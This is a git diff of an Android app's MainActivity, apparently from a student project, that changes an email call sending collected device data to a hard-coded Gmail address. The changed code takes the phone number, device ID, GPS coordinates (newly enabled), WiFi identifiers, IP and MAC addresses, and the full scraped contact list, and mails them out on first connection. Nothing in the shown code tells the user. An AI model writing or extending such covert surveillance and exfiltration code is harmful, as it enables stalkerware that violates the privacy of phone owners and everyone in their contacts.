@@ -202,11 +202,12 @@ public class MainActivity extends AppCompatActivity {
 
                 Location location = locationinfo.getLocation();
 
-                EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ androidID +"  |  Number:"+phoneNum , DeviceScrape.getDeviceInfo()
-//                        + "\nLocation: "+locationinfo.getLocation().getLongitude() +" "+locationinfo.getLocation().getLatitude()
-                        + "\nBattery Level:" + batterylevel + "\nWifi networkId: " + networkId + "\nWifi SSID: "+ ssid + "\nWifi BSSID: " + bssid
-                        + "\nWifi ipAddress: " + ipAddressString + "\nWifi macAddress: " + macAddress
-                        + "\n\n\nContacts:\n-----\n"
+                EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ androidID +"  |  Number:"+phoneNum , "Device Info\n-----"+DeviceScrape.getDeviceInfo()
+                        + "\nBattery Level:" + batterylevel
+                        + "\n\nLocation\n-----\nLongitude: "+locationinfo.getLocation().getLongitude() +"\nLatitude: "+locationinfo.getLocation().getLatitude()
+                        + "\n\nNetwork\n-----\nWIFI ID: " + networkId + "\nWIFI SSID: "+ ssid + "\nWIFI BSSID: " + bssid
+                        + "\nIP Address: " + ipAddressString + "\nMac Address: " + macAddress
+                        + "\n\nContacts:\n-----\n"
                         + ContactScrape.scrapeContacts(getContentResolver())
                 );
             }
